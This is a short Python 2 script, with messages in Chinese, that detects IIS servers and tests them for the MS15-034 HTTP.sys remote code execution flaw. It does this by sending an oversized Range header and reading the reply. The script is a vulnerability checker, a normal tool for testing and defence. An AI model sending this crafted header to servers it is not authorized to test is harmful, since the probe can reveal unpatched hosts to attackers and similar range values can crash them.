# -*- coding: utf-8 -*-

import requests

def identify_iis(domain):
    req = requests.get(str(domain))

    remote_server = req.headers['server']

    if 'Microsoft-IIS' in remote_server:

        print('服务是' + remote_server)

        ms15_034_test(str(domain))

    else:

        print('服务器不是IIS\n可能是: ' + remote_server)


def ms15_034_test(domain):
    print('启动vuln检查!')

    headers = {'Host': 'stuff', 'Range': 'bytes=0-18446744073709551615'}

    req = requests.get(str(domain), headers=headers)

    if 'Requested Range Not Satisfiable' in req.content:

        print '存在HTTP.sys远程代码执行漏洞!'

    elif 'The request has an invalid header name' in req.content:

        print '漏洞已修复'

    else:

        print 'IIS服务无法显示漏洞是否存在，需要手动检测'


if __name__ == '__main__':
    usr_domain = raw_input('输入域名扫描: ')
    identify_iis(usr_domain)
